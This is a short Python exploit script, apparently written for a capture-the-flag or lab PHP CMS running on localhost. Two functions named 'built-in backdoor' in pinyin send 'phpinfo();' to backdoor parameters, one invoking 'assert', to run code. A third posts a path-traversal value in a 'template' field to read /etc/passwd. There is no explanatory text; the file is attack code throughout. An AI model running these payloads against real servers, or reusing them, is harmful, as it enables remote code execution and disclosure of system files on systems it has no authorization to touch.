import requests

def zi_dai_hou_men_1():
	url = "http://127.0.0.1:8080/index.php/?POST=assert"
	data = {"GET":"phpinfo();"}
	print(requests.post(url,data).text)
def zi_dai_hou_men_2():
	url = "http://127.0.0.1:8080/cms/index.php"
	data = {"a":'phpinfo();'}
	print(requests.post(url,data).text)

def include_file():
	url = "http://127.0.0.1:8080/index.php/"
	data = {
	'template':"../../../../..../../../etc/passwd"
	}
	print(requests.post(url,data).text)
#zi_dai_hou_men_1()
#zi_dai_hou_men_2()
#include_file()